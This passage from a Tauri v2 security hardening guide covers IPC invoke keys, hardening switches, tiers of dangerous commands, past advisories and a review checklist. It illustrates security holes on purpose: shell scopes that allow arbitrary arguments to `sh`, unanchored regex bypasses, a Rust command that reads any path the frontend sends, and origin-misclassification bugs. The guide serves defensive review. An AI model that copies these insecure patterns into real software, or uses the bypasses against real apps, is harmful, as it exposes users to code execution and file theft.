runtime-generated key (`AppManager.invoke_key`, from `crate::generate_invoke_key()`) is injected
**only into frames Tauri itself initialised**; a frame Tauri did not initialise — an iframe calling
`window.ipc.postMessage` directly — is rejected with a warning. Quote the upstream limit to anyone who
over-trusts it: *"This key is **not** used to protect against compromised Tauri windows or WebViews
and is **only** intended to block IPC access from sub-frames."* It answers *which frame* and nothing
about *which script inside that frame*; an XSS in your own page has the key.

**Architectural consequence.** For untrusted or remote content prefer a **dedicated window** (on
Linux, a second webview in the same window) over an `<iframe>` — the official workaround from
GHSA-57fm-592m-34r7 and still the architectural recommendation. Give it its own capability with
`local: false` and minimum permissions, and make sure no `"windows": ["*"]` capability exists to undo
that (§4).

---

## 12. Hardening switches, and which of your commands are dangerous

**`app.security.freezePrototype`** (default `false`) freezes `Object.prototype` when using the custom
protocol, blocking prototype-pollution gadgets — a `__proto__` write that turns a data injection into
behaviour changes across every library on the page. In an AI app, model output flowing into
`JSON.parse` and then an object-merge helper is exactly that gadget. **Trade-off:** some frameworks
and polyfills mutate `Object.prototype` and break loudly — the good failure mode, found at startup.
**Gotcha:** the doc says "when using the custom protocol", so it will not apply to a window loaded
from `devUrl` in dev. `[INFERENCE]` Turn it on, run the app; if nothing breaks it is free.

**`app.withGlobalTauri`** (default `false`) injects the API on `window.__TAURI__`. **Risk:** the whole
*permitted* API surface lands on a global reachable by any script in the page, including injected
ones, with no bundler tree-shaking; it also loads plugin global API scripts
(`.global_api_script_path("./api-iife.js")`). Prefer `import { invoke } from '@tauri-apps/api/core'`.
**Be precise:** it widens *reachability*, not *authority* — the ACL still applies, and an injected
script can only call what the capability already granted. It removes a speed bump, it does not grant
permission. ⚠️ **one-way door** in practice: once snippets depend on the global, removing it is a
frontend rewrite. Moved from `build.withGlobalTauri` (v1) to `app.withGlobalTauri` (v2).

**`build.removeUnusedCommands`** (default `false`) sets `REMOVE_UNUSED_COMMANDS` so plugin commands
not referenced by any capability are **compiled out** — genuine attack-surface reduction, not config
hygiene: the code is not in the binary, so no future ACL mistake can reach it. Requires
`tauri-plugin 2.1` and `tauri 2.4`. **Caveat from the doc-comment:** it cannot see capabilities added
at runtime through the `dynamic-acl` feature, which is **enabled by default** and powers
`Manager::add_capability`. If you call `add_capability`, leave this off or disable `dynamic-acl`,
otherwise a runtime capability references a command that no longer exists.

**Devtools in release.** `devtools` is a Cargo feature, on by default in debug builds; on macOS it
uses **private APIs**, so shipping it makes the app App-Store-ineligible. Separately,
`core:webview:allow-internal-toggle-devtools` is part of `core:webview:default` — **any window with
`core:default` can toggle the inspector wherever the feature is compiled in.** If you compile it in
for support, deny it in production capabilities
(`"core:webview:deny-internal-toggle-devtools"`); per §6 that deny is global, which here is what you
want.

**Dev-time.** The built-in dev server is **unauthenticated and unencrypted**: *"…does not support
mutual authentication and transport encryption at the moment and should not be used on untrusted
networks."* An attacker on the same LAN can serve their own frontend to your dev machine — which in
dev usually holds the widest capability set you own.

### Which of your own commands are dangerous

A command is dangerous when the frontend chooses **what it acts on**, not merely whether it runs.

**Tier 1 — arbitrary code execution.** The shell plugin exposes five commands: `shell:allow-execute`
(run a scoped command to completion — **RCE if scoped loosely**), `shell:allow-spawn` (same,
long-running with a stream handle), `shell:allow-stdin-write` (feed bytes to a spawned child — turns
spawning an interpreter into an arbitrary-code channel), `shell:allow-kill` (low severity), and
`shell:allow-open` (hand a URL/path to the OS default handler; deprecated since 2.1.0 → use
`opener`). Its scope is command allow-listing with per-argument regex validation
(`plugins/shell/src/scope_entry.rs`): `ShellAllowedArgs::Flag(bool) | List(Vec<ShellAllowedArg>)`,
each arg `Fixed(String)` or `Var { validator, raw }`, with `validator` wrapped as `^{validator}$`
**unless `raw = true`**. Safe shape:

```json
// tauri 2.11.5 — fixed command, regex-validated variable argument
{ "identifier": "run-git-log", "windows": ["main"],
  "permissions": [ "shell:allow-execute",
    { "identifier": "shell:scope",
      "allow": [{ "name": "git-log", "cmd": "git",
                  "args": ["log", "--oneline", { "validator": "[a-f0-9]{7,40}" }] }] } ] }
```

Four ways to get it wrong:

- **`"args": true`** → `Flag(true)` → `args` becomes `None` → in `_prepare`,
  `(None, ExecuteArgs::List(list)) => Ok(list)` — **every argument the frontend sends is passed
  verbatim.** With `cmd: "sh"` or `"cmd"` that is unrestricted RCE. (`args: false`, the default,
  means zero arguments.)
- **`{ "validator": ".*" }`** — `^.*$` is not a validator.
- **`"raw": true` with an unanchored pattern** — skips the `^…$` wrapping, so a *substring* match
  passes. The classic bypass.
- **`allow-spawn` + `allow-stdin-write` over an interpreter** (`python`, `node`, `bash`) equals
  `allow-execute` over a shell even when every `args` entry is `Fixed`.

Calibrating fact: arguments go through `std::process::Command::arg` as an argv array, so there is **no
shell metacharacter interpretation unless the allowed command is itself a shell** — the plugin says
so and adds that this *"should be re-confirmed during upgrades of `open`"*. Widening
`shell:allow-open`'s default regex to permit `file://` hands the frontend "open arbitrary local file
with its default handler" — `.desktop` / `.lnk` / `.scpt` execution. `[COMMUNITY]`

**Tier 2 — your own path-taking commands.** The fs plugin enforces scope. Yours does not:

```rust
// anti-pattern: no ACL entry unless declared in build.rs, no scope, full process privilege
#[tauri::command]
fn read_config(path: PathBuf) -> String { std::fs::read_to_string(path).unwrap() }
```

In preference order: **(a) do not take a path** — take an opaque ID and resolve it in Rust against a
table you control; **(b) take `CommandScope<Entry>` / `GlobalScope<Entry>` and check it**,
canonicalising first (§7). Audit third-party plugins for whether they call `is_allowed` at all, and
prefer narrow base directories: `fs:allow-home-read-recursive` reads SSH keys, `.env` files and
browser profiles, and on Windows `requireLiteralLeadingDot` is `false` so dotfiles are included by
default.

**Tier 3 — deserialization and DoS.** Arguments are `serde`-deserialised before your body runs, so a
**panic in deserialization or in the command is a frontend-triggerable crash**. `SafeFilePath` accepts
both `"C:/Users"` (`::Path`) and `"file:///C:/Users"` (`::Url`), and the `Url` variant on iOS triggers
security-scoped-resource acquisition — a bespoke path newtype must handle both or explicitly reject
one. `tauri::ipc::Channel` and raw-body commands (`InvokeBody::Raw`) bypass JSON typing, so validate
lengths before allocating. Rule: **newtypes with validating `Deserialize`, every length and count
bounded, never `unwrap()` on frontend input.**

**Tier 4 — supply chain.** Any Rust code in core or a plugin runs unconstrained; a malicious
`tauri-plugin-*` crate owns the machine and capabilities are irrelevant to it. Upstream tooling:
`npm audit`, `cargo audit`, `cargo-vet`, `cargo crev`, `cargo supply-chain`, and *"only ever consume
critical dependencies from git using hash revisions at best or named tags as second best"* — for Rust
**and** Node. **Reproducible builds are not achievable today** (rustc reproducibility has open bugs;
most JS bundlers are non-deterministic), so you must trust your build system: pin third-party GitHub
Actions to SHAs.

**Tier 5 — updater compromise** (threat model only; mechanics in
`references/build-and-distribution.md`). Signature verification **cannot be disabled**. Losing the
private key means you can never update installed users again; **compromise means an attacker signs a
malicious update for every user — RCE at scale, and the one failure the app cannot repair itself.**
GHSA-2rcp-jvr4-r259 is the canonical leak path: a bundler's env inlining (Vite `envPrefix` / `define`)
baking `TAURI_SIGNING_*` into the frontend bundle. Never let those variables reach the frontend build.
A hardware token converts "permanent key compromise" into "bounded window of malicious signatures" —
a compromised CI can *use* the key but not *exfiltrate* it. Losing the manifest server, build server
or binary host defeats the updater regardless of key hygiene. `references/case-studies.md` §6
documents a real app with single-endpoint exposure.

---

## 13. Advisories — what actually keeps going wrong

| ID | CVE | Affected | Fixed | Substance |
| --- | --- | --- | --- | --- |
| GHSA-7gmj-67g7-phm9 | CVE-2026-42184 | **`tauri` >=2.0, <=2.11.0** | **`tauri` 2.11.1** | `is_local_url()` used `domain().split_once('.')` and compared only the **first label**, so `http://app.evil.com` was classified `Origin::Local` on Windows/Android when a protocol named `app` was registered. Remote pages could invoke `local: true`-only commands. CVSS 6.1. |
| GHSA-57fm-592m-34r7 | CVE-2024-35222 | `<=1.6.6`, `2.0.0-beta.0..=2.0.0-beta.19` | 1.6.7 / 2.0.0-beta.20 | Remote-origin iframes reached IPC without being listed in `dangerousRemoteDomainIpcAccess` (v1) / `capabilities` (v2). Fix removed macOS iframe IPC injection and added `__TAURI_INVOKE_KEY__`. |
| GHSA-2rcp-jvr4-r259 | — | v1 era | — | Updater private key leakable through Vite env-var inlining. |
| GHSA-wmff-grcw-jcfm | — | v1 era | — | Filesystem scope regression for dotfiles on Linux/macOS → `requireLiteralLeadingDot`. |
| GHSA-4wm2-cwcf-wwvp | — | v1 era | — | Open redirect could expose IPC to external sites. |
| GHSA-6mv3-wm7j-h4w5 | — | v1 era | — | Glob too permissive → `require_literal_separator: true` now hardcoded. |
| GHSA-q9wv-22m9-vhqh | — | v1 era | — | Filesystem scope partially bypassable. |
| GHSA-28m8-9j7v-x499 | — | v1 era | — | `readDir` scope bypass via symlinks → symlink resolution before matching. |

**Exposure tracks the `tauri` runtime crate, not `tauri-build`.** The vulnerable `is_local_url()`
lives in the runtime, so bumping the build crate fixes nothing. Check the resolved `tauri` version in
`Cargo.lock`, not the range in `Cargo.toml`. **Floor: `tauri >= 2.11.1`.** ZUS at `tauri 2.11.5` is
safe; Jan at `2.8.5` is exposed (`references/case-studies.md`).

**The pattern across all eight is origin and path *classification*, not permission modelling.** Not
one was "the ACL let the wrong permission through"; every one was "the code decided incorrectly what
this URL or path *is*". When reviewing a Tauri app, spend your time on **who is calling** and **what
this path/URL actually resolves to**, and comparatively little on whether the capability JSON is tidy.

### v1 → v2, security config only

Full delta in `references/architecture.md`; these rows change a security decision.

| v1 | v2 |
| --- | --- |
| `tauri > allowlist` | `capabilities/*.json` + `permissions/*.toml` (`tauri migrate` converts) |
| `tauri > pattern` | `app > security > pattern` |
| `tauri > allowlist > protocol > assetScope` | `app > security > assetProtocol > scope` (+ `enable`) |
| `build > withGlobalTauri` | `app > withGlobalTauri` |
| `dangerousRemoteDomainIpcAccess` | capability `remote: { urls: [...] }` + `local` — **field no longer exists** |
| `RemoteDomainAccessScope::enable_tauri_api` | `RemoteDomainAccessScope::add_plugin`, per plugin |
| `scope::FsScope` / `scope::IpcScope` / `Manager::fs_scope` | `scope::fs::Scope` / `scope::ipc::Scope` / `tauri_plugin_fs::FsExt` |
| `window.__TAURI_INVOKE__` | `window.__TAURI_INTERNALS__` + invoke key |
| `https://tauri.localhost` (Windows) | `http://tauri.localhost` — `useHttpsScheme: true` keeps the old origin and its storage |

---

## 14. Review checklist

Ordered by expected yield.

| # | Check | § |
| --- | --- | --- |
| 1 | `tauri` >= 2.11.1 in `Cargo.lock` — not `tauri-build` | 13 |
| 2 | `app.security.csp` present; no `'unsafe-eval'`; `'unsafe-inline'` only in `style-src`; `devCsp` not doing work prod never got | 9 |
| 3 | `dangerousDisableAssetCspModification` absent or `false`; if a list, the reason is written down | 9 |
| 4 | `assetProtocol.scope` is not `["**/*"]`; `requireLiteralLeadingDot` not `false` without a named path that needs it | 8 |
| 5 | No `"windows": ["*"]` capability unless the app is genuinely single-window | 4 |
| 6 | Every capability has a non-empty `windows` or `webviews` — otherwise it grants nothing, and someone "fixes" that by widening something else | 3, 4 |
| 7 | `remote.urls` capabilities also set `"local": false`; nothing relies on `remote.urls` as a boundary on Linux/Android | 11 |
| 8 | No `deny-*` used to carve a per-window exception — it is global | 6 |
| 9 | `shell` scope: no `"args": true`, no `"raw": true` with an unanchored regex, no shell/interpreter in `cmd`; `spawn` + `stdin-write` treated as `execute` | 12 |
| 10 | `fs` scopes: narrowest base dir that works; allow is OR'd across global + command scope, only `deny` narrows | 7 |
| 11 | Every app-owned `#[tauri::command]` taking a path, URL or command string consults `CommandScope`/`GlobalScope` or takes an opaque ID | 12 |
| 12 | `build.rs` declares app commands via `AppManifest::commands` if they should be ACL-gated — otherwise they bypass capabilities | 4 |
| 13 | `TAURI_SIGNING_*` never reaches the frontend bundler's env inlining | 12 |
| 14 | The window rendering model output has its own capability, and you have read its fully expanded command list | 2 |
| 15 | Consider `pattern = isolation`, `freezePrototype = true`, `removeUnusedCommands = true` (unless using `Manager::add_capability`) | 10, 12 |
| 16 | Drop `core:webview:allow-internal-toggle-devtools` from production capabilities if devtools is compiled in | 12 |
| 17 | `cargo audit` + `npm audit` in CI; third-party GitHub Actions pinned to SHAs | 12 |

---

**Evidence.** Read 2026-07-27/28 against `tauri 2.11.5` and `plugins-workspace@v2`.
Docs — `v2.tauri.app/security/` plus its `capabilities/`, `permissions/`, `scope/`, `csp/`,
`asset-protocol/`, `http-headers/`, `runtime-authority/`, `lifecycle/`, `ecosystem/` pages;
`v2.tauri.app/concept/inter-process-communication/isolation/`;
`v2.tauri.app/reference/acl/core-permissions/`; `v2.tauri.app/start/migrate/from-tauri-1/`;
`docs.rs/tauri/latest/tauri/`.
Source, `tauri-apps/tauri@dev` — `crates/tauri-utils/src/acl/capability.rs`,
`crates/tauri-utils/src/acl/mod.rs`, `crates/tauri-utils/src/config.rs`,
`crates/tauri-utils/src/html.rs`, `crates/tauri/src/ipc/authority.rs`,
`crates/tauri/src/manager/mod.rs`, `crates/tauri/src/scope/fs.rs`,
`examples/api/src-tauri/tauri.conf.json`.
Source, `tauri-apps/plugins-workspace@v2` — `plugins/fs/build.rs`, `plugins/fs/src/commands.rs`,
`plugins/fs/permissions/`, `plugins/shell/src/scope.rs`, `plugins/shell/src/scope_entry.rs`.
Advisories — GHSA-7gmj-67g7-phm9 (CVE-2026-42184), GHSA-57fm-592m-34r7 (CVE-2024-35222),
GHSA-2rcp-jvr4-r259, GHSA-wmff-grcw-jcfm, GHSA-4wm2-cwcf-wwvp, GHSA-6mv3-wm7j-h4w5,
GHSA-q9wv-22m9-vhqh, GHSA-28m8-9j7v-x499. Issue tauri#13788.
Real codebases — `references/case-studies.md` (ZUS `tauri 2.11.5`, Jan `tauri 2.8.5`).
